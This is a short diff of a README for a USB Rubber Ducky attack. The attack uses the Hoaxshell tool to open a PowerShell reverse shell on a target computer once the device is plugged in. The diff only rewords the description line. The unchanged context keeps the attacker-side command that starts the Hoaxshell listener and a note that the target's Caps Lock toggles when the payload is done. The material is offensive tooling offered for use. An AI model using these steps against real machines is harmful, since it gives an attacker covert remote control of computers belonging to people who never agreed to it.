@@ -1,7 +1,7 @@
 Hoaxshell with usb RubberDucky:
 -------------------------------------------
 
-Powershell reverse shell with Authorization ID using Hoaxshell,after we insert the USB RubberDucky wait a few seconds for the payload to load and when its done the Capslook turns ON/OFF on target
+Powershell reverse shell with Authorization ID using Hoaxshell,after inserting the USB RubberDucky wait a few seconds for the payload to load and execute, once its done the Capslook will turn ON/OFF on target
 
 on the attacker machine use the -g to remember the Authorization id
 ./hoaxshell.py -s X.X.X.X -r -g -H "Authorization"
